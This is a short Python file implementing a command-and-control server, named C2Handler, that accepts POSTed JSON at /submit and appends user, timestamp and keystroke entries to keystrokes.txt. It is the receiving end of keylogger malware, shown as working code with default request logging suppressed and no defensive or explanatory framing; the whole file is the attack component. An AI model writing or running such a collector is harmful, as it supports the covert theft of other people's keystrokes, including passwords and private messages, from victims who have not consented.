from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os

LOG_FILE = "keystrokes.txt"

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path != '/submit':
            self.send_response(404)
            self.end_headers()
            return

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        try:
            data = json.loads(post_data)
            logs = data.get("logs", [])
            with open(LOG_FILE, "a") as f:
                for entry in logs:
                    f.write(f"[{entry['t']}] {entry['u']}: {entry['k']}\n")
            print(f"[+] Wrote {len(logs)} keystrokes to {LOG_FILE}")
            self.send_response(200)
            self.end_headers()
        except Exception as e:
            print(f"[!] Error: {e}")
            self.send_response(500)
            self.end_headers()

    def log_message(self, format, *args):
        return  # Suppress default logging

if __name__ == "__main__":
    server_address = ("127.0.0.1", 8000)
    httpd = HTTPServer(server_address, C2Handler)
    print("[*] C2 server listening on https://127.0.0.1:8000/submit")
    httpd.serve_forever()
